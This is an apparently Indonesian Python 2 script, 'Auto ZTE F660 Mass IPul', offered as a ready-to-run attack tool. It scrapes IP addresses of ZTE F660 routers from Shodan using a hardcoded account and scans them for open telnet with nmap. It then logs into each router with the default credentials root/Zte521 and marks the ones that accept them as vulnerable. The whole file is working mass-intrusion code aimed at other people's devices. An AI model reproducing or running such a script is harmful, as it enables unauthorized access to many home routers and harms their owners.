#!/usr/bin/env python

''' Requirement: 
1. Python 2.x Meterpreter
2. Nmap - Port Scanner
'''

import mechanize
import re
import telnetlib
import os

print '''
 ################################################
 ### Auto ZTE F660 Mass IPul By: IRONBUGS     ###
 ################################################

'''
## Login, set header, handle cookie(?).
print "[+] Logging in..."
dk = mechanize.Browser()
dk.set_handle_robots(False)
dk.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
sign_in = dk.open("https://account.shodan.io/login")
dk.select_form(nr = 0)
dk["username"] = "colisehat" #username shodan account
dk["password"] = "jangancolimulu" #password shodan account
logged_in = dk.submit()

## Buat file.txt dulu, buat nanti setor IP.
dkfile = open("/root/Desktop/RouterIP.txt", "w+")
dkfile.close()

## Ambil semua IP per page, max 5 pages untuk Free member
print "[+] Collecting IP Address..."
maxPage = 1

while maxPage <= 5:
	req = dk.open("https://www.shodan.io/search?query=f660&page="+str(maxPage))
	respData = req.read()
	ip = re.findall(r'<div class="ip"><a href="/host/.*?">(.*?)</a>',str(respData))
	doofile = open("/root/Desktop/RouterIP.txt", "a")
	try:
		for anu in ip:
			doofile.write(str(anu)+"\n")
	except:
		pass
	maxPage += 1
doofile.close()
print "[+] Done..!!! File saved in /root/Desktop/RouterIP.txt"

print "[+] Scanning Telnet Port..."
os.system("nmap -T5 -vv -iL /root/Desktop/RouterIP.txt -p 23 | grep 'Discovered open port' | awk {'print $6'} | awk -F/ {'print $1'} > /root/Desktop/IP.txt")
print "[+] Saved in /root/Desktop/IP.txt"

print "[+] Logging in to target...."
iplist = open("/root/Desktop/IP.txt").read()
iplist = iplist.split()
for ipx in iplist:
	try:
		tn = telnetlib.Telnet(ipx, None, 13)
		tn.read_until("Login: ")
		tn.write("root\n")
		tn.read_until("Password: ")
		tn.write("Zte521\n")
		tn.write("exit\n")
		#print tn.read_all()
		tn.close()
		print ipx,'...Login Success !!! Target is Vulnerable'
	except Exception, e:
		print ipx, e, '...Not Vulnerable'
		continue
